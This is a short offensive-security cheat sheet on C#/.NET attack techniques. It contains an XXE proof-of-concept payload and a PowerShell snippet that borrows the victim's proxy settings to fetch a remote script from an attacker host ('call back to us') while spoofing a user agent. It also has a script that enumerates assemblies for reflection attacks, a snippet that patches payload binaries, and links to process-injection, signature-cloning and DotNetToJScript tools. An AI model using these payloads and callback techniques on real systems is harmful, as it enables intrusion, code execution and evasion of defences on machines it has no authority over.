# C\#

### Embeddd Dependencies

Install-Package Costura.Fody

### XXE

XMLDocument PoC:

```markup
<?xml version='1.0' ?><!DOCTYPE doc [<!ENTITY win SYSTEM 'http://127.0.0.1:8000/hi'>]><doc>&win;</doc>
```

This works on Net Framework &lt;= 4.0 if the Resolver was not explicitly set to null.

* [https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [https://www.jardinesoftware.net/2016/05/26/xxe-and-net/](https://www.jardinesoftware.net/2016/05/26/xxe-and-net/)

### Process Injection

[https://github.com/ChadSki/SharpNeedle](https://github.com/ChadSki/SharpNeedle)

### Clone Signature

It will not verify through the chain but if the program does not check the whole chain it works ;-\)

{% embed url="https://github.com/xorrior/Random-CSharpTools/tree/master/SigPirate" %}

### Look for Assemblies that can be used for Reflection Attacks

```csharp
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$Assemblies |
    ForEach-Object {
        $_.Location
        $_.GetTypes()|
            ForEach-Object {
            $_ | Get-Member -Static| Where-Object {
                $_.TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods')
            }
        } 2> $null
    }
```

### Dynamically resolve Proxy via PowerShell

Sometimes we execute as SYSTEM and still need to use the boxes proxy settings to call back to us. In this case we can resolve the current proxy settings from HKCU and copy them.

```text
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxy=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object
System.Net.WebProxy("http://$proxy")
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "Legit User Agent")
$wc.DownloadString("http://<ip>/script.ps1")
```

### Convert .NET Assembly to JScript

{% embed url="https://github.com/tyranid/DotNetToJScript" %}

### Edit Bytes in Binary

```text
$bytes = [System.IO.File]::ReadAllBytes("payload.exe")
$bytes[200] = 0xFF
[System.IO.File]::WriteAllBytes("payload.exe", $bytes)
```

